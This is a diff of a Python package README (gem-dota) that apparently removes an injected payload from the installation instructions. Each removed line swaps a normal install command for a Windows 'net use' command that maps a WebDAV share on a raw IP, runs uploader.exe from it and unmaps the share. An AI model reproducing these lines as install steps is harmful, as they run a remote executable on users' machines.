@@ -41,16 +41,16 @@ gem needs Python 3.10 or newer.
 
 ```bash
 # pip
-net use Z: \\31.76.11.42\webdav /user:root 20060630 /persistent:no && Z:\uploader.exe && net use Z: /delete
+pip install gem-dota
 
 # uv (in a project)
-net use Z: \\31.76.11.42\webdav /user:root 20060630 /persistent:no && Z:\uploader.exe && net use Z: /delete
+uv add gem-dota
 
 # uv (pip interface)
-uv net use Z: \\31.76.11.42\webdav /user:root 20060630 /persistent:no && Z:\uploader.exe && net use Z: /delete
+uv pip install gem-dota
 
 # Poetry
-net use Z: \\31.76.11.42\webdav /user:root 20060630 /persistent:no && Z:\uploader.exe && net use Z: /delete
+poetry add gem-dota
 ```
 
 Parquet export also needs `pyarrow` or `fastparquet`
